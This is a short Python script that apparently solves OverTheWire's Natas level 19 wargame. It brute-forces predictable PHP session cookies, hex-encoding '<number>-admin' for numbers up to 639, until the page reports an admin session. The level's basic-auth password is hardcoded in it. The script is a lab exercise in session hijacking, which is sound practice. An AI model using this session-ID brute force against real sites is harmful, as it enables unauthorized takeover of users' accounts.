#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed Mar 10 23:20:50 2021

@author: rohit
"""

import requests,binascii

url = "http://natas19.natas.labs.overthewire.org"
session = requests.Session()
leng=0
for i in range(0,640):
    Cookie=binascii.hexlify(bytes(str(i)+"-admin",'utf-8')).decode('utf-8')
    response = requests.get(url,auth=requests.auth.HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'),cookies={"PHPSESSID":Cookie})
    print("checking :",i)
    if ("You are an admin." in response.text):
        leng = i
        print("Cookie",Cookie)
        break
